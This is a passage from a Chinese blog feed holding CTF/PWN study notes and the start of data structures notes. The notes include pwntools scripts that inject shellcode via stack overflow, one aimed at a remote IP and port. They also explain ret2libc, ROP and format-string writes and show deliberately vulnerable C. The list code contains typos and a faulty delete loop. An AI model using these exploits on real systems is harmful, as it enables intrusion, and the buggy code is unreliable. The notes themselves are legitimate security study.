class="comment">#32位shellcode</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Please Input:\n&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (padding) + p32(bss_addr) <span class="comment">#因为是32位所以是p32()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;What&#x27;</span>s you name?\n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">io.sendline(payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io.interactive()</span></span><br></pre></td></tr></table></figure><p>三、这一类有一个前提，需要把NX(栈不可执行)保护关闭。程序会把栈的地址输出，然后我们接收程序输出的栈地址，然后向栈中输入shellcode，通过栈溢出出去跳到输入shellcode的位置，最终获取shell</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 09.01.43.png" alt="截屏2025-03-05 09.01.43" style="zoom:50%;" /></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn1&#x27;</span>)    <span class="comment">#本地的</span></span><br><span class="line">io = remote(<span class="string">&#x27;120.46.59.242&#x27;</span>, <span class="number">2117</span>)        <span class="comment">#远程IP</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">padding = <span class="number">0x70</span> + <span class="number">8</span> <span class="comment">#64位所以是8</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh()) <span class="comment">#64位shellcode</span></span><br><span class="line"></span><br><span class="line">v4_addr = <span class="built_in">int</span>(io.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode.ljust(padding,&#x27;a&#x27;)     #将shellcode填充到左边</span></span><br><span class="line"><span class="comment">#shellcode.rjust(padding, &#x27;a&#x27;)    #将shellcode填充到右边</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(padding,<span class="string">&#x27;a&#x27;</span>) + p64(v4_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="GOT表和PLT表"><a href="#GOT表和PLT表" class="headerlink" title="GOT表和PLT表"></a>GOT表和PLT表</h3><p>一、ret2libc的概念</p><p>ret2libc这种攻击方式主要是针对动态链接编译的程序，因为正常情况下是无法在程序中找到像system()、execve()这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址向他们，而不用通过这种麻烦的方式)</p><p>二、使用ret2libc的原因</p><p>现在操作系统为了增加系统的安全性，采取了ASLR和NX等安全措施，以防止恶意代码的注入和执行。通过ret2libc攻击，攻击者可以利用已加载到内存中的标准c库函数，从而完成对系统的攻击。</p><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>一、x32 payload结构</p><p>需要通过payload构造栈结构来泄漏地址和拼shell</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 09.20.05.png" alt="截屏2025-03-05 09.20.05" style="zoom:50%;" /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic 200 #生成200字节的垃圾数据</span><br><span class="line">cyclic -l地址 #计算到打改地址的字节数</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>二、计算libc基址(固定公式)</p><p>函数在libc中的偏移地址可以用python pwntools中的函数<code>libc.symbols[&#39;puts&#39;]</code>函数进行计算。</p><p>libc基地址 = 函数实际地址 - 函数在libc库中的偏移地址</p><p>system_addr = libc基地址 + system在libc库中的偏移地址</p><p>puts_addr = libc基地址 + puts在libc库中的偏移地址</p><p>三、x64 payload 结构</p><p>x64程序通过寄存器传参。</p><p>有六个寄存器用于传参分别是rdi、rsi、rdx、rcx、r8、r9</p><p>当六个寄存器用完才会在栈上传参</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 09.39.39.png" alt="截屏2025-03-05 09.39.39" style="zoom:50%;" /></p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>典型的系统调用包括read、write、open、close</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># x86架构</span><br><span class="line">write()的系统调用号就是0x4</span><br><span class="line">write()函数所执行的汇编代码：</span><br><span class="line">mov eax,0x4</span><br><span class="line">mov ebx,1</span><br><span class="line">mov ecx,[&quot;hello world\n&quot;]</span><br><span class="line">mov edx,13</span><br><span class="line">int 0x80</span><br><span class="line">==&gt;write(1,&quot;hello world\n&quot;,13)</span><br><span class="line"></span><br><span class="line">execve()函数所执行的汇编代码：</span><br><span class="line">mov eax,0xb</span><br><span class="line">mov ebx,[&#x27;/bin/sh&#x27;]</span><br><span class="line">mov ecx,0</span><br><span class="line">mov edx,0</span><br><span class="line">int 0x80</span><br><span class="line">==&gt;execve(&#x27;/bin/sh&#x27;,NULL,NULL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">execve(&#x27;/bin/sh&#x27;,NULL,NULL) 中/bin/sh要设置也就是rdi，后面两个参数为rsi和rdx因为是NULL就不设置了</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 09.52.27.png" alt="截屏2025-03-05 09.52.27" style="zoom:50%;" /></p><h4 id="返回向导编程"><a href="#返回向导编程" class="headerlink" title="返回向导编程"></a>返回向导编程</h4><p>一、定义</p><p>ROP是一种漏洞利用技术，利用程序的已有代码片段（即gadgets）来构建攻击payload，而不是注入新的代码。这对于执行非执行区域(NX，No eXecute)的内存非常有用。</p><p>二、特点</p><p>利用程序中已有的代码片段，这些片段通常是函数的结尾，包含ret指令</p><p>将这些片段链接在一起，形成攻击payload，用于执行恶意操作</p><p>ROP通常用于绕过DEP等安全机制</p><h4 id="ROP的一般工作原理"><a href="#ROP的一般工作原理" class="headerlink" title="ROP的一般工作原理"></a>ROP的一般工作原理</h4><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 10.12.23.png" alt="截屏2025-03-05 10.12.23" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 10.13.24.png" alt="截屏2025-03-05 10.13.24" style="zoom:50%;" /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern create 200     #生成200个字符串</span><br><span class="line">pattern offset 地址  #查看该地址的偏移量</span><br><span class="line">ROPgadget --binary 文件名 --string &#x27;需要查找的字符串&#x27; #能够查找到该字符串的地址</span><br><span class="line">ROPgadget --binary 文件名 --only &#x27;int&#x27; #能够查找int 0x80的地址</span><br><span class="line">ROPgadget --binary 文件名 --only &quot;pop|rdi|ret&quot; #能够查找到该字符串的地址</span><br></pre></td></tr></table></figure><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%12c&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一些常见的格式化说明符的含义：</p><ul><li>%d:以十进制整数形式输出整数</li><li>%f：以浮点数形式输出实数</li><li>%c：输出字符</li><li>%s：输出字符串</li><li>%x或%X：以十六进制形式输出整数</li></ul><p>可以是程序崩溃的格式字符串：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="存在格式化字符串漏洞的代码："><a href="#存在格式化字符串漏洞的代码：" class="headerlink" title="存在格式化字符串漏洞的代码："></a>存在格式化字符串漏洞的代码：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *input)</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(input);<span class="comment">//格式化字符串漏洞</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> secret_value = <span class="number">42</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//将输入读入到缓冲区中</span></span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,buffer);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//调用存在格式化字符串漏洞的函数</span></span><br><span class="line">  vulnerable_function(buffer);</span><br><span class="line">  </span><br><span class="line">  prinf(<span class="string">&quot;The secret value is: %d\n&quot;</span>, secret_value);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="栈布局的示例"><a href="#栈布局的示例" class="headerlink" title="栈布局的示例"></a>栈布局的示例</h5><ol><li><p>栈布局初始状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+---------------------------------+</span><br><span class="line">|     buffer                 | &lt;- 栈底</span><br><span class="line">+---------------------------------+</span><br><span class="line">|     secret_value     |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|     saved return address | &lt;- 栈顶</span><br><span class="line">+---------------------------------+</span><br><span class="line">。。。。。。。。。。。。。。。</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>攻击者构造的格式化字符串：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot;%x %x %x %x %x %x %x %x&quot;</span><br></pre></td></tr></table></figure></li></ol><ol><li>栈修改后的状态</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+---------------------------------+</span><br><span class="line">|&quot;%x %x %x %x %x %x %x %x&quot;| &lt;- 栈底</span><br><span class="line">+---------------------------------+</span><br><span class="line">|     secret_value     |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|     saved return address | &lt;- 栈顶</span><br><span class="line">+---------------------------------+</span><br><span class="line">。。。。。。。。。。。。。。。</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure><p>查看任意地址的内存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%3$d&quot;</span>,a,b,c); <span class="comment">//会输出c地址几$就会输出第几个参数的值</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>任意地址写</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//%n是4字节 %hn是2字节 %hhn时一个字节</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a string, and count is %n\n&quot;</span>,&amp;count); </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,count);<span class="comment">//输出结果count=31</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//%n可以用于字符串输出的同时改变变量的值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="网络安全" scheme="https://guipi01.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="PWN" scheme="https://guipi01.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>数据结构</title>
    <link href="https://guipi01.github.io/posts/79666db.html"/>
    <id>https://guipi01.github.io/posts/79666db.html</id>
    <published>2025-04-06T09:39:09.000Z</published>
    <updated>2025-04-06T09:58:38.899Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2024-09-11 12.00.43.png" alt="截屏2024-09-11 12.00.43"></p><p>常对幂指阶</p><p>结论：1. 顺序执行的代码只会影响常数项，可以忽略</p><pre><code>       2. 只需挑循环中的一个基本操作分析它的执行次数与n的关系即可       3. 如果有多层嵌套循环，只需关注最深层循环循环了几次</code></pre><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2024-09-11 12.13.23.png" alt="截屏2024-09-11 12.13.23"></p><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>程序代码—-&gt;大小固定，与问题规模无关</p><p>算法原地工作——-算法所需内存空间为常量</p><p>空间复杂度=递归调用的深度</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2024-09-11 12.23.00.png" alt="截屏2024-09-11 12.23.00"></p><h3 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h3><p>线性表是具有相同数据类型的n(n&gt;=0)个数据元素的有限序列。</p><p>除第一个元素外，每个元素有且仅有一个直接前驱；除最后一个元素外，每个元素有且仅有一个直接后继。</p><p>注意：<strong>位序从1开始，数组下标从0开始</strong></p><p>什么时候要传入参数的引用”&amp;” ——对参数的修改结果需要”带回来”</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">int</span> &amp;x)</span></span>&#123;</span><br><span class="line">    x = <span class="number">1024</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test函数内部x=%d\n&quot;</span>,x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;调用test前x=%d\n&quot;</span>,x);</span><br><span class="line">    <span class="built_in">test</span>(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;调用test后x=%d\n&quot;</span>,x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h4><p>顺序表——用顺序存储的方式实现线性表顺序存储。把逻辑上相邻的元素存储在屋里位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系体现。</p><h5 id="静态分配"><a href="#静态分配" class="headerlink" title="静态分配"></a>静态分配</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100         <span class="comment">//定义最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    ElemType data[MaxSize];   <span class="comment">//用静态的&quot;数组&quot;存放数据元素</span></span><br><span class="line">    <span class="type">int</span> length;               <span class="comment">//顺序表的当前长度</span></span><br><span class="line">&#125;SqList;                    <span class="comment">//顺序表的类型定义(静态分配方式)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="动态分配"><a href="#动态分配" class="headerlink" title="动态分配"></a>动态分配</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>             <span class="comment">//malloc,free函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> InitSize 10      <span class="comment">//顺序表的初始长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>                     </span><br><span class="line">    ElemType *data;                 <span class="comment">//指示动态分配数组的指针</span></span><br><span class="line">    <span class="type">int</span> Maxsize;                     <span class="comment">//顺序表的最大容量</span></span><br><span class="line">    <span class="type">int</span> length;            <span class="comment">//顺序表的当前长度</span></span><br><span class="line">&#125;SqList;                 <span class="comment">//顺序表的类型定义(动态分配方式)</span></span><br><span class="line"></span><br><span class="line">c语言</span><br><span class="line">  </span><br><span class="line">L.data = (ElemType *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ElemTye) * InitSize);</span><br><span class="line"><span class="built_in">malloc</span>函数： 动态申请内存空间</span><br><span class="line"><span class="built_in">malloc</span>函数返回一个指针，需要强制转型为你定义的数据元素类型指针</span><br><span class="line"><span class="built_in">malloc</span>函数的参数，指明要分配多大的连续内存空间</span><br><span class="line"><span class="built_in">free</span>函数： 释放内存空间</span><br><span class="line"></span><br><span class="line">c++语言</span><br><span class="line">new和delete关键字</span><br></pre></td></tr></table></figure>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用malloc函数申请一片连续的存储空间</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">    L.data = (<span class="type">int</span> *)<span class="built_in">malloc</span>(InitSize*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    L.MaxSize = InitSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//增加动态数组的长度</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">IncreaseSize</span><span class="params">(SqList &amp;L,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="type">int</span> *p = L.data;</span><br><span class="line">    L.data = (<span class="type">int</span> *)<span class="built_in">malloc</span>((L.MaxSize+len)*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; L.length; i++)&#123;</span><br><span class="line">            L.data[i] = p[i];                                <span class="comment">//将数据复制到新区域</span></span><br><span class="line">    &#125;</span><br><span class="line">    L.MaxSize = L.MaxSize + len;                <span class="comment">//顺序表最大长度增加len    </span></span><br><span class="line">    <span class="built_in">free</span>(p);                                                        <span class="comment">//释放原来的内存空间</span></span><br><span class="line">&#125;</span><br><span class="line">时间开销大</span><br><span class="line"></span><br><span class="line">注：<span class="built_in">realloc</span>函数也可实现增加动态数组的长度</span><br></pre></td></tr></table></figure><h5 id="顺序表的特点"><a href="#顺序表的特点" class="headerlink" title="顺序表的特点"></a>顺序表的特点</h5><ol><li>随机访问，即可以在O(1)时间内找到第i个元素——代码实现：<strong>data[i - 1]</strong>;静态分配、动态分配都一样</li><li>存储密度高，每个节点只存储数据元素</li><li>拓展容量不方便(即便采用动态分配的方式实现，拓展长度的时间复杂度也比较高)</li><li>插入、删除操作不方便，需要移动大量元素</li></ol><h5 id="顺序表的基本操作——插入"><a href="#顺序表的基本操作——插入" class="headerlink" title="顺序表的基本操作——插入"></a>顺序表的基本操作——插入</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Stutas <span class="title function_">ListInsert</span><span class="params">(SqList &amp;L, <span class="type">int</span> i, <span class="type">int</span> e)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(i&lt;<span class="number">1</span> || i&gt;L.length+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> ERROR;</span><br><span class="line">  <span class="keyword">if</span>(L.length &gt;= MaxSize)</span><br><span class="line">    <span class="keyword">return</span> ERROR;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = L.lengthl;j&gt;= i; j--)            <span class="comment">//将第i个元素及之后的元素后移</span></span><br><span class="line">            L.data[j] = L.data[j - <span class="number">1</span>];</span><br><span class="line">    L.data[i - <span class="number">1</span>] = e;                                        <span class="comment">//在位置i处放入e</span></span><br><span class="line">    L.length++;                                                      <span class="comment">//长度加1</span></span><br><span class="line">  <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">插入的时间复杂度：O(n/<span class="number">2</span>)</span><br><span class="line">注意：位序、数组下标的关系，并从后面的元素依次移动</span><br></pre></td></tr></table></figure><h5 id="顺序表的基本操作——删除"><a href="#顺序表的基本操作——删除" class="headerlink" title="顺序表的基本操作——删除"></a>顺序表的基本操作——删除</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Status <span class="title function_">ListDelete</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span> || i&gt;L.length)                                    <span class="comment">//判断i的范围是否有效</span></span><br><span class="line">    <span class="keyword">return</span> ERROR;</span><br><span class="line">  e = L.data[i - <span class="number">1</span>];                                        <span class="comment">//将被删除的元素赋值给e</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>;j &lt; L.length;j++)&#123;            <span class="comment">//将第i个位置后的元素前移</span></span><br><span class="line">      L.data[j - <span class="number">1</span>] = L.data[j];</span><br><span class="line">  &#125;</span><br><span class="line">  L.length--;                                                        <span class="comment">//线性表长度减1</span></span><br><span class="line">  <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">删除的时间复杂度：O((n<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line">注意：位序、数组下标的关系，并从前面的元素依次移动</span><br></pre></td></tr></table></figure><h5 id="顺序表的基本操作——按位查找"><a href="#顺序表的基本操作——按位查找" class="headerlink" title="顺序表的基本操作——按位查找"></a>顺序表的基本操作——按位查找</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Status <span class="title function_">GetElem</span><span class="params">(SqList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span> || i&gt;L.length)</span><br><span class="line">    <span class="keyword">return</span> ERROR;</span><br><span class="line">    <span class="keyword">return</span> L.data[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">时间复杂度O(<span class="number">1</span>)——因为随机存取特性</span><br></pre></td></tr></table></figure><h5 id="顺序表的基本操作——按值查找"><a href="#顺序表的基本操作——按值查找" class="headerlink" title="顺序表的基本操作——按值查找"></a>顺序表的基本操作——按值查找</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在顺序表L中查找第一个元素值等于e的元素，并返回其位序</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">LocateElem</span><span class="params">(SqList L,ElemType e)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;L.length;i++)</span><br><span class="line">            <span class="keyword">if</span>(L.data[i] == e)</span><br><span class="line">                <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度O((n+1)/2)</span></span><br></pre></td></tr></table></figure><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2024-09-16 16.16.03.png" alt="截屏2024-09-16 16.16.03"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义结点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//增加一个新的结点：在内存中申请一个结点所需空间，并用指针p指向这个结点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> LNode));</span><br></pre></td></tr></table></figure><p>强调这是一个单链表——使用LinkList</p><p>强调这是一个结点——使用LNode *</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//带头结点的单链表</span></span><br><span class="line">Status <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));                <span class="comment">//分配一个头结点</span></span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>)                                                                <span class="comment">//内存不足，分配失败</span></span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;                                                        <span class="comment">//头结点之后暂时没有结点</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单链表——按位序插入"><a href="#单链表——按位序插入" class="headerlink" title="单链表——按位序插入"></a>单链表——按位序插入</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//带头结点</span><br><span class="line">Status ListInsert(LinkList &amp;L,int i,ElemType e)&#123;</span><br><span class="line">    if(i &lt; 1)</span><br><span class="line">        return ERROR;</span><br><span class="line">    LNode *p;                                                                    //指针p指向当前扫描到的结点</span><br><span class="line">    int j = 0;                                                                //当前p指向的是第几个结点</span><br><span class="line">    p = L;                                                                        //L指向头结点，头结点是第0个结点(不存数据)</span><br><span class="line">    while(p &amp;&amp; j &lt; i -1)&#123;                                            //循环找到第i-1个结点</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    if(p == NULL)                                                                //i值不合法</span><br><span class="line">        return ERROR;</span><br><span class="line">    LNode *s = (LNode *)malloc(sizeof(LNode));</span><br><span class="line">    s -&gt; data = e;</span><br><span class="line">    s -&gt; next = p -&gt; next;</span><br><span class="line">    p -&gt; next = s;                              //将结点s连到p之后</span><br><span class="line">    return OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2024-09-16 16.39.48.png" alt="截屏2024-09-16 16.39.48"></p><h5 id="单链表——按位序插入-gt-不带头结点"><a href="#单链表——按位序插入-gt-不带头结点" class="headerlink" title="单链表——按位序插入===&gt;不带头结点"></a>单链表——按位序插入===&gt;不带头结点</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">  ElemType data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode.*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i, ElemType e)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(i==<span class="number">1</span>)&#123;                                                                            <span class="comment">//插入第1哥结点的操作与其他节点操作不同</span></span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">      s-&gt;data=e;</span><br><span class="line">    s-&gt;next=L;</span><br><span class="line">    L=s;                                                                                <span class="comment">//头指针指向新结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  LNode *p;                                                                            <span class="comment">//指针p指向当前扫描到的结点</span></span><br><span class="line">  <span class="type">int</span> j=<span class="number">1</span>;                                                                            <span class="comment">//当前p指向的是第几个结点</span></span><br><span class="line">  p=L;                                                                                    <span class="comment">//p指向第1个结点(注：不是头结点)</span></span><br><span class="line">  <span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;j&lt;i<span class="number">-1</span>)&#123;                                                <span class="comment">//循环找到第i-1个结点</span></span><br><span class="line">    p = 